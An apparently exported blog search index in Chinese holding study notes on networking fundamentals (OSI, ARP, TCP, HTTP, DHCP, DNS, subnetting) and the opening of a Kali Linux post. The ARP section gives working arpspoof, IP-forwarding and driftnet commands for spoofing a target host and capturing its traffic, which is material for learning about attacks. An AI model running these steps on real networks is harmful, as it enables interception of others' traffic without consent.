<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>计算机网络基础</title>
    <url>/2022/08/27/000%E2%80%94%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="OSI七层参考模型"><a href="#OSI七层参考模型" class="headerlink" title="OSI七层参考模型"></a>OSI七层参考模型</h1><p>​	产生：由于早期计算机厂商使用的是私有的网络模型，给彼此通信带来不少麻烦，于是乎，1984年ISO颁布了OSI参考模型</p>
<p><strong>功能</strong></p>
<ul>
<li>物理层：属于最底层，将二进制数转换为传输的电信号或光信号（建立、维护、断开物理链接）</li>
<li>数据链路层：建立逻辑链接，进行硬件地址寻址（MAC地址）、差错校验</li>
<li>网络层：进行逻辑地址寻址（IP地址）、实现不同网络之间路径选择</li>
<li>传输层：定义传输数据的协议端口号、流控（流量控制）、差错校验</li>
<li>会话层：建立、管理、终止会话</li>
<li>表示层：数据的表示：加密、压缩…………</li>
<li>应用层：将原始的数据转换为电脑可识别的二进制数</li>
</ul>
<h2 id="数据链路层-交换机"><a href="#数据链路层-交换机" class="headerlink" title="数据链路层(交换机)"></a>数据链路层(交换机)</h2><p><strong>工作原理</strong></p>
<p>​	交换机里面维护了一张 MAC地址表，主要记录的是 MAC地址 和 接口 的对应关系，初始状态下为空</p>
<p>​	<strong>假设交换机上有 3 个接口，主机A——1号口、主机B——2号口、主机C——3号口</strong></p>
<ul>
<li><p>当交换机收到发来的 数据帧 后查看 帧头部，首先查看 <strong>源MAC地址</strong> 有无记录在自己的 MAC表 中</p>
</li>
<li><p>没有的话记录：主机A——接口1，接着查看 <strong>目的MAC地址</strong> 是否有记录在内</p>
</li>
<li><p>没有则直接从除接收接口（1号口）外 的所有连接的接口转发（广播），主机B 与 主机C 都收到后，主机C丢弃，主机B回应（主机解封数据后会比对目的MAC地址，若不对应则丢弃）</p>
</li>
<li><p>因 主机B 的MAC地址并未记录，所以交换机会记录 主机B 的MAC地址：主机B——接口2，然后直接从1号接口转发（单播）</p>
</li>
</ul>
<p><em>总结：交换机学习源 MAC、广播数据帧、接收方回应、回应方单播直接转发</em></p>
<h2 id="网络层（路由器）"><a href="#网络层（路由器）" class="headerlink" title="网络层（路由器）"></a>网络层（路由器）</h2><p><strong>功能</strong></p>
<ul>
<li>进行逻辑地址（IP 地址）寻址，实现不同网络（网络地址不等 或 内网和外网分割）之间的路径选择</li>
<li>查找目的是否可以到达，如果可以到达，选择一条最优路径；如果不能，直接返回 发送方 一个消息</li>
</ul>
<p>网络层 所封装的的是IP头部，所传输的 PDU（传输数据单元）是 数据包（IP数据包）</p>
<p><strong>路由</strong></p>
<ul>
<li>概念：从 源主机 到 目标主机 的 转发数据包 的过程（跨网络访问）</li>
<li>确定最佳路径（手动指定、根据动态路由协商方式）、通过网络传输信息</li>
</ul>
<p><strong>路由表</strong>（路由器里维护了一张路由表）</p>
<ul>
<li><p>直连路由表：当路由器的接口 配置好对应的 IP地址 并开启接口后自动生成</p>
</li>
<li><p>非直连：需要手动配置静态路由 或 使用动态路由协议学习</p>
</li>
<li><p>静态路由</p>
<ul>
<li>由管理员手动配置，不灵活 且 是单向的</li>
<li>特殊的静态路由：默认路由，当在路由器中找不到目标网络的路由条目时，再去查看默认路由；一般应用于   末节（末梢）网络（网络的最末端）</li>
</ul>
</li>
<li><p>动态路由</p>
<ul>
<li>通过某种动态路由协议自动建立自己的路由表</li>
<li>常见协议：RIP、OSPF、IS-IS、BGP、IGRP、EIGRP</li>
</ul>
</li>
</ul>
<h1 id="TCP-x2F-IP-传输控制-x2F-网际-协议-四层模型"><a href="#TCP-x2F-IP-传输控制-x2F-网际-协议-四层模型" class="headerlink" title="TCP&#x2F;IP(传输控制&#x2F;网际 协议)四层模型"></a>TCP&#x2F;IP(传输控制&#x2F;网际 协议)四层模型</h1><ul>
<li><p>网络接口层</p>
</li>
<li><p>网络层：IP协议（<strong>ARP</strong>：地址解析协议；<strong>RARP</strong>：逆地址解析协议；<strong>ICMP</strong>：网际控制报文协议，ping 命令；<strong>IGMP</strong>：网际组管理协议）</p>
</li>
<li><p>传输层：TCP（传输控制协议：<strong>传输数据更加稳定可靠</strong>）、UDP（用户数据报协议：<strong>传输效率更高</strong>）</p>
</li>
<li><p>应用层：HTTP、HTTPS、SSH、DNS、POP3、IMAP、TFTP…………</p>
</li>
</ul>
<h2 id="网络层-ARP、ICMP"><a href="#网络层-ARP、ICMP" class="headerlink" title="网络层(ARP、ICMP)"></a>网络层(ARP、ICMP)</h2><h3 id="ARP-协议"><a href="#ARP-协议" class="headerlink" title="ARP 协议"></a><strong>ARP 协议</strong></h3><p>​	<strong>将一个已知的 IP 地址解析为MAC 地址</strong>，从而进行二层（数据链路层）数据的交互，是一个三层（网络层）的协议，但工作在二层，可以说是一个2.5层协议</p>
<p><strong>工作流程</strong></p>
<ul>
<li>ARP 请求，以广播方式发送请求（广播：一种信息的传播方式，一对多的方式）</li>
<li>ARP 响应，响应时是单播</li>
</ul>
<p>​	ARP 缓存：为了避免重复发送 ARP 请求，动态条目会有老化时间（在一定时间内，若表中某一行没有使用，就会被删）</p>
<blockquote>
<p>在 windows 中可直接使用 arp 命令<br>arp -a		通过询问当前协议数据，显示当前 ARP 项。<br>arp -d		删除 inet_addr 指定的主机。inet_addr 可以是通配符 *，以删除所有主机。<br>        inet_addr 为指定 Internet 地址。（IP 地址）</p>
</blockquote>
<p>​	网关：与主机直连的 路由器接口、防火墙 等边界网络设备的 IP地址</p>
<p><strong>ARP 攻击（仅欺骗 主机）</strong> </p>
<ul>
<li><p>伪造 ARP 应答报文，向被攻击主机响应<strong>虚假</strong>的 MAC 地址；当被攻击主机进行网络通信时，会将数据交给虚假的 MAC 地址进行转发，但虚假的 MAC 地址不存在，所以造成被攻击主机无法访问网络</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="line">		-i interface  指定要使用的网卡</span><br><span class="line">		-t target   指定要攻击的主机(如果没有指定，则认为是局域网中所有主机)重复可以指定多个主机</span><br><span class="line">		host   		host是你想要截获数据包的主机 (通常是网关)</span><br><span class="line">arpspoof -i eth0 -t 192.168.0.106 192.168.0.1			按 ctrl+Z 即可停止</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>ARP 欺骗 （欺骗 网关 与 主机）</strong></p>
<ul>
<li><p>伪造 ARP 应答报文，向 <strong>被攻击主机</strong> 和 <strong>网关</strong> 响应真实的 MAC 地址，当 被攻击主机 进行网络通信时，会将数据交给真实的 MAC 地址进行转发，从而截获被攻击主机的数据（攻击主机 要开启 IP 转发功能）</p>
<p>​	在上方的基础上，打开 IP 转发功能，开启后，被攻击主机可正常上网，但我们可以用 wirehark 进行抓包（因为被攻击主机的流量是从 kali 转发出去的）;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward			1 是开启，0 是关闭</span><br></pre></td></tr></table></figure>

<p>​	也可以用 driftnet 抓取被攻击主机所访问的图片（明文上的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">driftnet [options] [filter code]</span><br><span class="line">			-d　　指定临时目录</span><br><span class="line">			-a　　附加模式：捕获图片并保存到临时目录；不显示捕获图片窗口。</span><br><span class="line">			-i　　设置要监听的接口（网卡）</span><br><span class="line">driftnet -i eth0</span><br><span class="line">driftnet -d /img -a -i eth0</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="ICMP-协议"><a href="#ICMP-协议" class="headerlink" title="ICMP 协议"></a><strong>ICMP 协议</strong></h3><ul>
<li>Internet 控制报文协议</li>
<li>用于在 <strong>IP主机 、路由器之间传递控制信息</strong>（控制消息：网络通不通、主机是否可达、路由是否可用）</li>
<li>属于网络层的协议，封装在传输层与网络层之间</li>
</ul>
<p>​	Ping 程序会发送一个 ICMP echo 请求消息给 目的主机，并报告应答情况</p>
<p><strong>ICMP重定向</strong></p>
<p>​	在某些特定的情况下，路由器检测到主机使用非优化路由时，会向主机发送一个 ICMP重定向报文，使主机的路由改变</p>
<h2 id="传输层-TCP、UDP"><a href="#传输层-TCP、UDP" class="headerlink" title="传输层(TCP、UDP)"></a>传输层(TCP、UDP)</h2><h3 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a><strong>TCP 协议</strong></h3><ul>
<li>面向连接的传输协议</li>
<li>要求数据在传输之前必须建立连接，数据传输完成后，必须释放连接</li>
<li>仅支持单播传输：在两个终端之间建立的点对点连接，不支持广播</li>
</ul>
<p><strong>三次握手</strong></p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/000/000%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80-01.png"></p>
<p>​	TCP确认号(Acknowledgment Number,ACK number)：表示 接收方 期望收到 发送方 下一个报文段的 第一个字节数据的编号，其值是 接收计算机即将收到的 下一个序列号，即 上一个请求报文的字节序列号 加1</p>
<p>​	SYN：在建立连接时使用，用来同步序号。当 SYN&#x3D;1，ACK&#x3D;0时，表示这是一个请求建立连接的报文段；当 SYN&#x3D;1，ACK&#x3D;1时，表示对方同意建立连接；只有在前两次握手中 SYN&#x3D;1</p>
<p>​	ACK：表示前面的确认号字段是否有效，ACK&#x3D;1 时有效。TCP规定，连接建立后，ACK必须为 1</p>
<p>​	RST：表示 是否重置连接，若 RST&#x3D;1，说明 TCP连接出现错误(如主机崩溃)，必须释放连接，在重新建立</p>
<p>​	FIN：标记 数据是否发送完毕，若 FIN&#x3D;1，表示数据已经发送完成，可以释放连接</p>
<p><strong>UDP 协议</strong></p>
<ul>
<li>用户数据报协议，传输层的另一个协议</li>
<li>不需要建立连接，直接发送数据，不会去重新排序，不能够确认</li>
</ul>
<h2 id="应用层-HTTP、DHCP、DNS"><a href="#应用层-HTTP、DHCP、DNS" class="headerlink" title="应用层(HTTP、DHCP、DNS)"></a>应用层(HTTP、DHCP、DNS)</h2><h3 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a><strong>HTTP 协议</strong></h3><p><strong>概念</strong></p>
<ul>
<li>超文本传输协议，用于在 万维网服务器 上传输超文本(HTML) 到 本地浏览器 的传输协议</li>
<li>传输 HTML文本、图片、查询结构等，基于传输层 TCP 的80端口</li>
</ul>
<p><strong>报文</strong></p>
<p>​	用于 HTTP 协议交互的信息称为 HTTP报文，请求端的报文叫做<strong>请求</strong>报文，响应端的报文叫做<strong>响应</strong>报文。报文包括：<strong>报文首部</strong>、<strong>空行</strong>（换行）、<strong>报文主体</strong> 组成</p>
<ol>
<li>报文首部：客户端 或（服务端） 需处理的 请求 或（响应）的内容或属性</li>
<li>报文主体：用于传输 请求 或 相应 的实体</li>
</ol>
<p>​	在 HTTP 请求中，第一行必须是请求行，用来说明 请求类型、要访问的资源 和 使用的HTTP版本 ，接着是报文的首部，空行之后就是报文主体，如下是报文首部的一些参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HOST: 请求的目的地</span><br><span class="line">Accept: 指浏览器或其他客户可以接受的 MIME文件格式</span><br><span class="line">User-Agent: 是客户端浏览器名称</span><br><span class="line">Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us，指英语</span><br><span class="line">Cookie: 浏览器用这个属性向服务器发送Cookie</span><br><span class="line">Referer: 提供访问来源的信息，即给出引荐网页的URL，告诉服务器用户在访问当前资源之前的位置，可以追踪用户</span><br><span class="line">X-Forwarded-For: 用来识别连接到 Web 服务器的 客户端的真实IP</span><br><span class="line">Content-Type: 用来表明request的内容类型</span><br><span class="line">Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是ISO-8859-1</span><br><span class="line">Accept-Encoding: 指出浏览器可以接受的编码方式。为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式</span><br></pre></td></tr></table></figure>

<p><strong>万维网服务</strong></p>
<p>​	Internet上广泛应用的信息服务技术。采用 C&#x2F;S 架构，但 客户机 是通过 浏览器 请求，从而在 浏览器 上看到对应的图形界面，又称为 浏览器&#x2F;服务器(B&#x2F;S)架构（Browser&#x2F;Server）</p>
<p><strong>工作原理</strong></p>
<ul>
<li>客户端 使用 浏览器通过 URL 向 HTTP服务器 发送请求</li>
<li>Web服务器 根据收到的请求直接向 客户机 相应信息</li>
</ul>
<p><strong>注意事项</strong></p>
<ul>
<li>无连接：限制每次连接只能处理一个请求。（只需TCP三次握手成功 后就可以发送请求）</li>
<li>无状态：没有记忆能力，当后续处理的内容需要用到 之前的内容时，必须重传（登录）。于是就有了 cookie与session</li>
<li>独立的：只有 客户端 和 服务器 知道如何处理数据内容，任何类型的数据都可以通过 HTTP发送，客户端 和 服务器 指定使用适合的 MIME-type（文件类型）</li>
</ul>
<p><strong>状态码</strong></p>
<table>
<thead>
<tr>
<th>Status Code</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>2XX</td>
<td>请求成功</td>
</tr>
<tr>
<td>3XX</td>
<td>重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td>4XX</td>
<td>客户端错误</td>
</tr>
<tr>
<td>5XX</td>
<td>服务器错误，服务器在请求过程中发生错误</td>
</tr>
</tbody></table>
<h4 id="cookie、session"><a href="#cookie、session" class="headerlink" title="cookie、session"></a>cookie、session</h4><p>Cookie：在 客户端 记录信息确定用户身份，Session：在 服务器端 记录信息确定用户身份。</p>
<p>​	HTTP协议是 无状态协议(无记忆能力)，一旦数据传输完毕，客户端 与 服务器端 就会断开连接；再次交换数据需要建立新的连接，这就导致其无法 在连接上 跟踪会话，于是就出现了 cookie 和 session</p>
<p><strong>Cookie</strong></p>
<p>​	是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能</p>
<p>​	某些网站为了 <strong>辨别用户身份</strong>，进行 会话跟踪 而储存在用户本地终端上的数据（通常经过加密），由 用户客户端 暂时或永久保存的信息，通俗地说就是 鉴别用户身份的凭证(类似身份证)</p>
<ol>
<li>会话级cookie：保存在内存，浏览器关闭时自动消失</li>
<li>持久化cookie：保存在硬盘，浏览器关闭不会消失，其生命周期 取决于 失效时间(Expires&#x2F;Max-Age)</li>
</ol>
<p><strong>cookie鉴权实现</strong></p>
<ul>
<li>客户端 第一次<strong>访问</strong> 服务器时 服务器端会生成cookie(当然需要cookie时才会)，然后通过 响应头部 中的 Set-Cookie 传给客户端(格式为key&#x3D;value键值对)，客户端 将其保存</li>
<li>客户端 再访问 服务器 时，在请求报文中的 请求头 里就会带上 客服端 保存的 cookie，与 服务器端 的cookie 进行对比</li>
</ul>
<p><strong>session</strong></p>
<p>​	服务器为了 <strong>保存用户状态</strong> 而创建的一个特殊的对象，它允许服务器在请求之间保留特定用户的信息，如：用户身份验证凭据、购物车内容等。其有两种传递方式（服务器端存储、cookie、URL重写）</p>
<ol>
<li>session 数据存储在服务器端，客户端只保存 session ID，在请求时发送给服务器</li>
<li>将 sessionid 放在 <strong>cookie</strong> 中，当浏览器关闭就会消失，可以用做临时的cookie存放(会话级)</li>
<li>通过 response.encodeURL() 重写URL(如果客户端 禁用 或 不支持 session，一般不使用)</li>
</ol>
<p><strong>session鉴权</strong></p>
<ul>
<li>当客户端 登录 服务器的时候，服务器的内存 创建一个 session内存(该对象有一个唯一的id，一般称为sessionid) 并保存在 服务器</li>
<li>然后在请求报文的响应头里把 sessionid 通过 cookie 的方式传递给客户端(sessionid<strong>默认</strong>生命周期:半小时)</li>
<li>之后 客户端 访问 服务器 时所有的请求都会在请求头带上 sessionid，然后和 服务器 保存的 session 进行对比，以此来识别不同的用户</li>
</ul>
<p><em>（ps：sessionid 是识别 session 的唯一依据，session 一般保存在服务端，只返回随机生成的 sessionid 给客户端，它们都是后端生成的）</em></p>
<h3 id="DHCP-协议"><a href="#DHCP-协议" class="headerlink" title="DHCP 协议"></a><strong>DHCP 协议</strong></h3><ul>
<li>动态主机配置协议，广泛应用于局域网内部，<strong>主要给客户机提供 TCP&#x2F;IP 参数</strong>（IP地址、子网掩码、网关、DNS）</li>
<li>减少管理员的工作量、避免输入错误、避免IP冲突、提高IP地址利用率</li>
</ul>
<p><strong>工作原理</strong></p>
<ul>
<li>应用层的协议，基于 UDP，主机发送请求到DHCP服务器的67号端口，服务器应答消息给主机的68号端口</li>
<li>客户机于服务器的交互过程<ul>
<li>客户机以广播方式发送 DHCP discover报文，网络中所有 DHCP服务器都会收到，并去响应；客户机会向 收到第一个发送offer报文服务器 发送 DHCP request 报文，服务器确认，客户机获得 TCP&#x2F;IP参数</li>
</ul>
</li>
</ul>
<p><strong>DHCP 防御</strong> <strong>（在交换机上配置信任端口）</strong></p>
<ul>
<li>开启 DHCP 监听</li>
</ul>
<blockquote>
<p>ip dhcp snooping</p>
</blockquote>
<ul>
<li>指定监听 vlan</li>
</ul>
<blockquote>
<p>ip dhcp snooping vlan 1<br>由于开启了监听，所有交换机上的端口都变为非信任端口（会拒绝DHCP报文），需要添加信任端口</p>
</blockquote>
<ul>
<li>添加信任端口</li>
</ul>
<blockquote>
<p>int f0&#x2F;1 		进入端口 f0&#x2F;1<br>ip dhcp snooping trust</p>
</blockquote>
<p>​	当交换机开启 dhcp snooping 后，所有端口变为非信任端口（拒绝 dhcp discover），当交换机上的某一个端口设置为信任端口后，其他所有端口变成 可信任端口（拒绝 dhcp offer）</p>
<h3 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a><strong>DNS 协议</strong></h3><p>​	域名系统，作为将 域名 与 IP地址 的相互映射关系存放在一个分布式的数据库，使用的是UDP的53号端口</p>
<p><strong>域名空间</strong></p>
<p>​	树状结构</p>
<ul>
<li>根域（全世界只有13台根域服务器）：” . “</li>
<li>顶级域：主要用于区分域名用途，商业类：com、教育和学习：edu、社会非盈利组织：org、中国：cn</li>
<li>二级域</li>
</ul>
<p><strong>DNS 查询过程</strong></p>
<ul>
<li>客户机想要访问 <code>www.baidu.com</code>，会根据自己的 TCP&#x2F;IP 参数向自己的首选DNS服务器发送 DNS请求</li>
<li>首选DNS服务器收到客户机的请求后，回去查询自己的区域文件，若找不到 域名 的IP地址信息，将请求转发到根域服务器（需要配置根提示）；若可以找到 IP地址，直接响应给客户机</li>
<li>根域服务器收到请求后，由于根服务器只维护 顶级域服务器信息，会响应顶级域服务器IP（com），首选DNS 根据根域服务器 相应的信息，将请求转发到 com顶级域</li>
<li>com顶级域服务器 收到请求，由于 com顶级域服务器 只维护 二级域信息，会响应二级域服务器IP （baidu.com）  ，首选DNS 根据 顶级域响应的信息，将请求转发到 baidu.com 二级域</li>
<li>baidu.com二级域 收到请求，baidu.com DNS服务器里维护的是 baidu.com区域的所有主机信息，当然也包含了<code> www.baidu.com</code> 的信息，直接将 <code>www.baidu.com</code> 的IP地址响应给 首选DNS</li>
<li>首选DNS 最后响应给客户机</li>
</ul>
<p><strong>两种查询方式</strong></p>
<ol>
<li>递归查询：当客户机请求自己的 首选DNS服务器，首选DNS服务器 上有域名记录信息，直接响应给客户机</li>
<li>迭代查询：首选DNS 没有域名记录信息，通过一步步请求根域服务器、顶级域服务器、二级域服务器，最终找到域名记录信息</li>
</ol>
<h1 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li><p>用来表示网络中的某一台主机（某一个网络接口），是主机的唯一标识，保障主机间的正常通信（主机想要进行网络通信，就必须配置相应的IP地址）</p>
</li>
<li><p>一种网络编码，确定网络中的一个节点</p>
</li>
<li><p>IP地址由32位二进制组成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.105</span><br><span class="line">11000000.10101000.00000000.1101001</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>组成</strong></p>
<ol>
<li><p>网络部分：标识网络的范围</p>
</li>
<li><p>主机部分：标识网络范围中的一个节点</p>
</li>
</ol>
<p>  网络部分越长，表示网络的范围越小；网络部分越短，表示网络的范围越大</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><strong>1.公有 IP 地址</strong></p>
<p>​		地址分为A、B、C、D、E五类</p>
<ul>
<li><p>A类：前 8 位为网络位（以 0 为开头，即首位为 0 ，下同），后 24 位位主机位</p>
<p>​	<em><strong>第一个 8 位</strong>组范围为 0-127，但 0 表示本地网络，127 开头的地址一般用于回路检测，最终范围：1-126</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0000000.		0</span><br><span class="line">0 1111111.		127</span><br></pre></td></tr></table></figure>
</li>
<li><p>B类：前 16 位位网络位（以 10 为开头），后 16 位位主机位</p>
<p>​	网络位的范围为 128.0-191.255</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 000000.00000000		128.0	</span><br><span class="line">10 111111.11111111		191.255</span><br></pre></td></tr></table></figure>
</li>
<li><p>C类：前 24 位位网络位（以 110 为开头），后 8 位位主机位</p>
<p>​	网络位的范围为192.0.0-223.255.255</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">110 00000.00000000.00000000		192.0.0</span><br><span class="line">110 11111.11111111.11111111		223.255.255</span><br></pre></td></tr></table></figure>
</li>
<li><p>A类：10.0.0.0-10.255.255.255</p>
</li>
<li><p>B类：172.16.0.0-172.31.255.255</p>
</li>
<li><p>C类：192.168.0.0-192.168.255.255</p>
</li>
</ul>
<p>私网地址是不能在公网上进行直接访问的，需要网络地址转换将 私网地址 转换为 公网地址 才可访问公网内容</p>
<h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ul>
<li><p>用来确定IP地址的网络部分</p>
</li>
<li><p>由 32 位二进制组成，对应IP的网络部分由 1 表示（二进制，下同），主机部分由 0 表示</p>
<ul>
<li><p>根据子网掩码得出网络部分与主机部分。在本网络的首个地址是网络地址；最后一个是广播地址</p>
</li>
<li><p>网络地址：本网段的网络号，代表的是一个范围，不能给主机使用</p>
</li>
<li><p>广播地址：代表本网段的所有地址，同样不能直接给主机使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.16.230.222/16		/16 子网掩码为 16 位</span><br><span class="line">255.255.0.0</span><br><span class="line">10101100.00010000.11100110.11011110			IP地址二进制</span><br><span class="line">11111111.11111111.00000000.00000000			子网掩码二进制</span><br><span class="line">10101100.00010000.00000000.00000000			网络地址	172.16.0.0</span><br><span class="line">10101100.00010000.11111111.11111111			广播地址	172.16.255.255</span><br><span class="line">===========================================================================</span><br><span class="line">192.168.100.233/19	   19位子网掩码</span><br><span class="line">255.255.224.0		   子网掩码，当不是255时，转换为二进制，1 位置的是网络部分</span><br><span class="line">       .111 00000	   网络部分位 11111111.11111111.111</span><br><span class="line">192.168.011 00100	   网络地址：192.168.96.0，广播地址：192.168.127.255</span><br><span class="line">===========================================================================</span><br><span class="line">172.24.88.99/23					23位子网掩码</span><br><span class="line">      .0101100 0.00000000			网络地址</span><br><span class="line">      .0101100 1.11111111 			广播地址</span><br><span class="line">11111111.11111111.1111111 0.00000000		子网掩码二进制</span><br><span class="line">255.255.254.0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>默认子网掩码</p>
<ul>
<li>A类：255.0.0.0			   8 位</li>
<li>B类：255.255.0.0 	     16 位</li>
<li>C类：255.255.255.0  	24位</li>
</ul>
</li>
</ul>
<p>子网掩码越长，代表网络部分越长，即网络范围越小；子网掩码越短，代表网络部分越短，网络范围越大</p>
<h2 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h2><p><strong>原因</strong></p>
<ul>
<li>从公网层面讲：A类地址总共有 126 个网络，如果A类网络给一个机构或企业使用，由于A类地址中主机部分范围广，使机构或企业无法使用完全，造成 IP 浪费（节省IP地址）</li>
<li>实现网络的层次性</li>
<li>满足不同网络多 IP 地址的需求IP 地址分类</li>
</ul>
<p><strong>IP 地址分类</strong></p>
<ul>
<li>有类地址：一个 IP 地址采用的 <strong>是</strong> 默认的子网掩码</li>
<li>无类地址：一个 IP 地址采用的 <strong>不是</strong> 默认的子网掩码</li>
</ul>
<p><strong>原理</strong></p>
<p>​	子网位划分：增加网络部分（向主机位借位，借的位数称为 <strong>子网位</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.1.20/24</span><br><span class="line">192.168.1.0/24		网络地址</span><br><span class="line">此网络范围 IP 地址有256个（192.168.1.0~192.168.1.255）</span><br><span class="line">可用主机数（192.168.1.1~192.168.1.254）</span><br><span class="line">======================================================================================</span><br><span class="line">	向主机部分借1位，24 位的子网掩码划分后变成了两个网段</span><br><span class="line">192.168.1.00000000/24	</span><br><span class="line">192.168.1.0 0000000/25------&gt;192.168.1.0/25</span><br><span class="line">192.168.1.1 0000000/25------&gt;192.168.1.128/25</span><br><span class="line">===============================================================================</span><br><span class="line">	向主机部分借 3 位，</span><br><span class="line">192.168.1.0/24</span><br><span class="line">192.168.1.000 00000------&gt;192.168.1.0/27</span><br><span class="line">192.168.1.001 00000------&gt;192.168.1.32</span><br><span class="line">192.168.1.010 00000------&gt;192.168.1.64</span><br><span class="line">192.168.1.011 00000------&gt;192.168.1.96</span><br><span class="line">192.168.1.100 00000------&gt;192.168.1.128</span><br><span class="line">192.168.1.101 00000------&gt;192.168.1.160</span><br><span class="line">192.168.1.110 00000------&gt;192.168.1.192</span><br><span class="line">192.168.1.111 00000------&gt;192.168.1.224</span><br><span class="line">===============================================================================</span><br><span class="line">	假设子网位为 n,则可划分网络个数为 2的 n 次方</span><br><span class="line">借 1 位：2 个网段		主机位 7 位			每个网络中的 IP 地址个数：128</span><br><span class="line">借 2 位：4 个网段		主机位 6 位			每个网络中的 IP 地址个数：64</span><br><span class="line">借 3 位：8 个网段		主机位 5 位			每个网络中的 IP 地址个数：32</span><br><span class="line">借 4 位：16 个网段	主机位 4 位			每个网络中的 IP 地址个数：16</span><br><span class="line">借 5 位：32 个网段	主机位 3 位			每个网络中的 IP 地址个数：8</span><br><span class="line">借 6 位：64 个网段	主机位 2 位			每个网络中的 IP 地址个数：4	</span><br><span class="line">借 7 位：128 个网段	主机位 1 位（没有可用的IP地址给主机使用，此网段一个是网络地址，一个是广播地址）</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-Linux命令</title>
    <url>/2022/09/23/001%E2%80%94kali-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    <content><![CDATA[<p>​	Linux，全称GNU&#x2F;Linux，是一种 类UNIX 操作系统，有上百种不同的发行版，下图是 Linux 的大分支图示</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/001/001Linux-04.jpg" alt="001Linux-04"></p>
<p><strong>历史</strong></p>
<p>​	1964年，三家很牛的组织联合起来打算研发一种分时操作系统 Multics，但这个项目没有成功，当时参与此计划的贝尔实验室的工程师 肯·汤普森(小名)写了个运行在 Multics 的小游戏，贝尔实验室退出这个计划后， 肯·汤普森自己写了一个小型的操作系统UNIX，重写了他的“star travel”游戏<del>(牛逼啊，玩不了游戏就自己写一个操作系统)</del>，Linux就是UNIX的演化版本</p>
<p><strong>分时操作系统</strong></p>
<p>​	是指在一台主机上连接多个带有显示器和键盘的终端，同时允许多个用户通过 主机的终端 以交互方式使用计算机来共享主机中的资源，是一个多用户交互式操作系统</p>
<p>分时：多个用户分享使用同一台计算机，多个程序分时共享硬件和软件资源</p>
<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><blockquote>
<p>使用 Kali操作系统 时应注意及时更新源，就像 更新手机应用 一个道理，命令有 apt-get update、apt-get upgrade 和 apt-get dist-upgrade</p>
</blockquote>
<ul>
<li>apt-get update：只更新 软件包 的索引源，更新 同步源的软件包的 索引信息，从而进行软件更新</li>
<li>apt-get upgrade：升级系统上安装的 所有软件包，若更新失败，所涉及的包会保持更新前的状态</li>
<li>apt-get dist-upgrade：升级整个 Linux系统</li>
</ul>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​	Unix系统的哲学思想：一切都是文件，Linux是由Unix系统而来，所以也继承了这个思想，Linux文件系统的设计目的：用来存储文件和管理文件</p>
<p>​	Linux文件系统的文件是数据的集合，文件系统不仅包含着文件中的数据，而且还有文件系统的结构，Linux用户和应用程序看到的文件、目录、软连接及文件保护信息等都存储在其中（操作系统是用来管理硬件和应用程序及其文件系统的）</p>
<p>​	Linux文件系统采用树状结构图，方便文件的查看与管理</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/001/001Linux-03.jpg" alt="001Linux-03"></p>
<p>​	Linux中所有内容都是以文件的形式保存和管理的，没有Windows中 有C盘、D盘的概念，硬件设备也是文件，硬件设备需要挂载到相应的目录文件才能使用</p>
<p>​	Linux运行 <code>dh -f</code> 命令，查看 目前存在的硬盘分区情况 和 每个分区的硬盘使用情况</p>
